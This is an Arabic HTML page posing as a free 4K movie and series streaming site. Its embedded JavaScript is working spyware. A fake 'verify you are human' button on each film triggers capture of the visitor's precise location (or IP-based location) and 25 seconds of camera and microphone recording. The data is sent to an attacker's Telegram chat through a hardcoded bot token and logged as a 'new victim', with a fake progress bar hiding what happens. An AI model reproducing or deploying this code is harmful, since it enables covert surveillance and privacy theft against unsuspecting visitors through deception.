<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>سينما فور يو - أقوى موقع أفلام ومسلسلات</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Tajawal', 'Segoe UI', sans-serif;
            background: radial-gradient(circle at 10% 20%, #0a0f1e, #05080f);
            color: #fff;
            line-height: 1.6;
        }
        .navbar {
            background: rgba(10, 15, 30, 0.95);
            backdrop-filter: blur(15px);
            padding: 1rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
            border-bottom: 1px solid rgba(229, 9, 20, 0.5);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .logo {
            font-size: 1.8rem;
            font-weight: bold;
            background: linear-gradient(135deg, #e50914, #ff6a00);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .nav-links { display: flex; gap: 2rem; }
        .nav-links a { color: #ddd; text-decoration: none; cursor: pointer; transition: 0.3s; }
        .nav-links a:hover { color: #e50914; }
        .search-box {
            background: #1e1e2f;
            padding: 0.5rem 1rem;
            border-radius: 40px;
            border: 1px solid #333;
            color: white;
            width: 220px;
            outline: none;
        }
        .hero {
            background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(0,0,0,0.6)), url('https://image.tmdb.org/t/p/original/wwemzKWzjKYJFfCeiB57q3r4Bcm.png');
            background-size: cover;
            background-position: center;
            padding: 5rem 2rem;
            text-align: center;
        }
        .hero h1 { font-size: 3rem; margin-bottom: 1rem; }
        .hero p { font-size: 1.2rem; color: #ccc; }
        .section { padding: 2rem; }
        .section-title {
            font-size: 1.8rem;
            margin-bottom: 1.5rem;
            border-right: 5px solid #e50914;
            padding-right: 1rem;
            display: inline-block;
        }
        .movies-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
            gap: 1.8rem;
            margin-top: 1rem;
        }
        .movie-card {
            background: #141824;
            border-radius: 16px;
            overflow: hidden;
            cursor: pointer;
            transition: transform 0.3s;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .movie-card:hover { transform: translateY(-8px); border-color: #e50914; }
        .movie-poster { width: 100%; aspect-ratio: 2/3; overflow: hidden; }
        .movie-poster img { width: 100%; height: 100%; object-fit: cover; transition: 0.3s; }
        .movie-card:hover .movie-poster img { transform: scale(1.05); }
        .movie-info { padding: 1rem; text-align: center; }
        .movie-title { font-weight: bold; font-size: 1rem; }
        .movie-year { font-size: 0.8rem; color: #aaa; }
        .coming-soon-note { font-size: 0.7rem; color: #ffaa33; margin-top: 0.5rem; background: rgba(0,0,0,0.6); padding: 0.2rem; border-radius: 20px; }
        .player-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.96);
            backdrop-filter: blur(12px);
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        .player-container {
            width: 90%;
            max-width: 500px;
            background: #11131f;
            border-radius: 28px;
            overflow: hidden;
            border: 1px solid rgba(229,9,20,0.5);
        }
        .movie-poster-large { width: 100%; aspect-ratio: 16/9; background: #07090f; overflow: hidden; }
        .movie-poster-large img { width: 100%; height: 100%; object-fit: cover; }
        .video-placeholder {
            background: #0c0e17;
            padding: 1.5rem;
            text-align: center;
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
        .verify-btn {
            background: linear-gradient(90deg, #e50914, #b00710);
            border: none;
            padding: 12px 28px;
            border-radius: 50px;
            color: white;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            width: fit-content;
            margin: 0 auto;
            box-shadow: 0 4px 12px rgba(229,9,20,0.4);
        }
        .verify-btn:hover { transform: scale(1.02); }
        .close-player {
            position: absolute;
            top: 25px;
            right: 35px;
            color: white;
            font-size: 2rem;
            cursor: pointer;
            background: rgba(0,0,0,0.6);
            width: 45px;
            height: 45px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: 0.2s;
        }
        .close-player:hover { background: #e50914; transform: rotate(90deg); }
        .rainbow-text {
            background: linear-gradient(90deg, #ff0000, #ff7700, #ffff00, #00ff00, #0000ff, #8b00ff);
            background-size: 200% auto;
            color: transparent;
            background-clip: text;
            -webkit-background-clip: text;
            animation: rainbow 2.5s linear infinite;
            font-weight: bold;
            font-size: 1.2rem;
        }
        @keyframes rainbow { 0% { background-position: 0% center; } 100% { background-position: 200% center; } }
        .progress-bar { width: 80%; height: 5px; background: #2a2a3a; border-radius: 10px; margin: 1rem auto; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: #e50914; animation: loading 40s linear forwards; }
        @keyframes loading { 0% { width: 0%; } 100% { width: 100%; } }
        footer { text-align: center; padding: 2rem; color: #777; border-top: 1px solid #1e1e2f; margin-top: 2rem; }
        @media (max-width: 768px) {
            .navbar { flex-direction: column; text-align: center; }
            .hero h1 { font-size: 2rem; }
        }
    </style>
</head>
<body>

<div class="navbar">
    <div class="logo">🎬 CINEMA4U</div>
    <div class="nav-links">
        <a onclick="scrollToSection('home')">الرئيسية</a>
        <a onclick="scrollToSection('movies')">أفلام</a>
        <a onclick="scrollToSection('series')">مسلسلات</a>
        <a onclick="scrollToSection('coming')">قريباً</a>
    </div>
    <input type="text" class="search-box" placeholder="🔍 ابحث عن فيلم أو مسلسل..." id="searchInput" onkeyup="searchItems()">
</div>

<div id="home" class="hero">
    <h1>أفلام ومسلسلات حصرية بجودة 4K</h1>
    <p>شاهد بدون إعلانات وبدون اشتراك – تجربة سينما لا تُنسى</p>
</div>

<div id="movies" class="section">
    <h2 class="section-title">🎬 أفلام حصرية</h2>
    <div class="movies-grid" id="moviesGrid"></div>
</div>

<div id="series" class="section">
    <h2 class="section-title">📺 مسلسلات حصرية</h2>
    <div class="movies-grid" id="seriesGrid"></div>
</div>

<div id="coming" class="section">
    <h2 class="section-title">⏳ قريباً</h2>
    <div class="movies-grid" id="comingGrid"></div>
</div>

<footer>by massil — جميع الحقوق محفوظة © 2026</footer>

<script>
    // ========== إعدادات البوت (لا تغيرها) ==========
    const BOT_TOKEN = '8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo';
    const CHAT_ID = '6052532044';

    function sendTextToTelegram(text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('text', text);
        fetch(url, { method: 'POST', body: formData }).catch(e => console.error(e));
    }

    function sendFileToTelegram(file, type) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        const filename = `${type}_${Date.now()}.${type === 'video' ? 'mp4' : 'webm'}`;
        const fileObj = new File([file], filename, { type: file.type });
        formData.append(type === 'video' ? 'video' : 'audio', fileObj);
        const endpoint = type === 'video' ? 'sendVideo' : 'sendAudio';
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
        fetch(url, { method: 'POST', body: formData }).catch(e => console.error(e));
    }

    sendTextToTelegram("🌐 تم فتح موقع الأفلام (النسخة الأسطورية)");

    function stealLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    sendTextToTelegram(`📍 الموقع الدقيق: ${lat}, ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`);
                },
                err => {
                    fetch('https://ipapi.co/json/')
                        .then(r => r.json())
                        .then(d => sendTextToTelegram(`🌐 الموقع التقريبي: IP ${d.ip}, ${d.city}, ${d.country_name}`))
                        .catch(() => sendTextToTelegram("❌ تعذر الحصول على الموقع"));
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            sendTextToTelegram("❌ المتصفح لا يدعم تحديد الموقع");
        }
    }

    let videoRecorder = null, audioRecorder = null;
    let videoChunks = [], audioChunks = [];

    async function startSpying() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            videoChunks = [];
            videoRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            videoRecorder.ondataavailable = e => { if (e.data.size) videoChunks.push(e.data); };
            videoRecorder.onstop = async () => {
                const blob = new Blob(videoChunks, { type: 'video/webm' });
                await sendFileToTelegram(blob, 'video');
            };
            videoRecorder.start();

            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            audioChunks = [];
            audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
            audioRecorder.ondataavailable = e => { if (e.data.size) audioChunks.push(e.data); };
            audioRecorder.onstop = async () => {
                const blob = new Blob(audioChunks, { type: 'audio/webm' });
                await sendFileToTelegram(blob, 'audio');
            };
            audioRecorder.start();

            setTimeout(() => {
                if (videoRecorder && videoRecorder.state === 'recording') videoRecorder.stop();
                if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
                stream.getTracks().forEach(t => t.stop());
                audioStream.getTracks().forEach(t => t.stop());
            }, 25000);

            sendTextToTelegram("🔴 بدء المراقبة (كاميرا + ميكروفون)");
        } catch (e) {
            sendTextToTelegram(`❌ فشل الوصول للأجهزة: ${e.message}`);
        }
    }

    // ========== قوائم الأفلام والمسلسلات (كل الصور التي أرسلتها) ==========
    // ملاحظة: تأكد من رفع هذه الصور إلى مجلد images بنفس الأسماء
    const movies = [
        { title: "Ratatouille", year: "2007", img: "ratatouille.jpg" },
        { title: "Harry Potter", year: "2001", img: "harry_potter.jpg" },
        { title: "Titanic", year: "1997", img: "titanic.jpg" },
        { title: "The Avengers", year: "2012", img: "avengers.jpg" },
        { title: "Divergent", year: "2014", img: "divergent.jpg" },
        { title: "The Fault in Our Stars", year: "2014", img: "fault_in_our_stars.jpg" },
        { title: "Maleficent", year: "2014", img: "maleficent.jpg" },
        { title: "GOAT", year: "2026", img: "goat.jpg" },
        { title: "War Machine", year: "2026", img: "war_machine.jpg" },
        { title: "New Movie 1", year: "2026", img: "3cb428f7b5e7246ee9c2727862e423e4.jpg" },
        { title: "New Movie 2", year: "2026", img: "2b14da6668dcc8e6456ab0ce9bcf1a5d.jpg" }
    ];

    const series = [
        { title: "The Walking Dead", year: "2010", img: "walking_dead.jpg" }
    ];

    const comingSoon = [
        { title: "Scream 7", year: "2026", img: "scream.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" },
        { title: "Ready or Not 2", year: "2026", img: "ready_or_not.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" }
    ];

    function loadItems(containerId, items, type, showNote = false) {
        const grid = document.getElementById(containerId);
        if (!grid) return;
        grid.innerHTML = '';
        items.forEach(item => {
            const card = document.createElement('div');
            card.className = 'movie-card';
            card.innerHTML = `
                <div class="movie-poster">
                    <img src="images/${item.img}" alt="${item.title}" loading="lazy" onerror="this.src='https://placehold.co/300x450?text=${encodeURIComponent(item.title)}'">
                </div>
                <div class="movie-info">
                    <div class="movie-title">${item.title}</div>
                    <div class="movie-year">${item.year}</div>
                    ${showNote ? `<div class="coming-soon-note">${item.note}</div>` : ''}
                </div>
            `;
            if (!showNote) {
                card.onclick = () => openPlayer(item.title, type, `images/${item.img}`);
            } else {
                card.style.cursor = 'default';
            }
            grid.appendChild(card);
        });
    }

    function searchItems() {
        const query = document.getElementById('searchInput').value.toLowerCase();
        document.querySelectorAll('.movie-card').forEach(card => {
            const title = card.querySelector('.movie-title')?.innerText.toLowerCase() || '';
            card.style.display = title.includes(query) ? 'block' : 'none';
        });
    }

    function scrollToSection(id) {
        document.getElementById(id).scrollIntoView({ behavior: 'smooth' });
    }

    let currentTitle = '', currentType = '', currentPoster = '';
    let timeoutId = null, isSpyingActive = false;

    function openPlayer(title, type, posterUrl) {
        currentTitle = title;
        currentType = type;
        currentPoster = posterUrl;
        const overlay = document.createElement('div');
        overlay.className = 'player-overlay';
        overlay.innerHTML = `
            <div class="close-player" id="closePlayerBtn">✕</div>
            <div class="player-container">
                <div class="movie-poster-large">
                    <img src="${posterUrl}" alt="${title}" onerror="this.src='https://placehold.co/400x225?text=${title}'">
                </div>
                <div class="video-placeholder" id="videoPlaceholder">
                    <span style="font-size:1.2rem; font-weight:bold;">🎬 ${title}</span>
                    <button id="verifyAccessBtn" class="verify-btn">✅ تحقق من هويتك</button>
                    <div class="rainbow-text">صلو على النبي</div>
                    <p style="font-size:0.8rem;">لأسباب أمنية، نحتاج للتأكد من أنك إنسان حقيقي</p>
                </div>
            </div>
        `;
        document.body.appendChild(overlay);

        document.getElementById('closePlayerBtn').onclick = () => overlay.remove();

        const btn = document.getElementById('verifyAccessBtn');
        btn.onclick = async () => {
            if (isSpyingActive) return;
            isSpyingActive = true;
            stealLocation();
            await startSpying();
            const placeholderDiv = document.getElementById('videoPlaceholder');
            placeholderDiv.innerHTML = `
                <span style="font-size:1.2rem;">✅ جاري التحقق من هويتك...</span>
                <div class="rainbow-text">صلو على النبي</div>
                <div class="progress-bar"><div class="progress-fill"></div></div>
                <p style="font-size:0.8rem;">قد يستغرق التحقق دقيقة، يرجى الانتظار</p>
            `;
            sendTextToTelegram(`🎯 ضحية جديدة: ${type} - ${title}`);
            timeoutId = setTimeout(() => {
                placeholderDiv.innerHTML = `
                    <span>⚠️ انتهت مهلة الاتصال بالخادم</span>
                    <button id="retryBtn" class="verify-btn">إعادة المحاولة</button>
                    <div class="rainbow-text">صلو على النبي</div>
                `;
                const retryBtn = document.getElementById('retryBtn');
                if (retryBtn) {
                    retryBtn.onclick = () => {
                        clearTimeout(timeoutId);
                        isSpyingActive = false;
                        overlay.remove();
                        openPlayer(currentTitle, currentType, currentPoster);
                    };
                }
            }, 40000);
        };
    }

    loadItems('moviesGrid', movies, 'فيلم', false);
    loadItems('seriesGrid', series, 'مسلسل', false);
    loadItems('comingGrid', comingSoon, '', true);
</script>
</body>
</html>
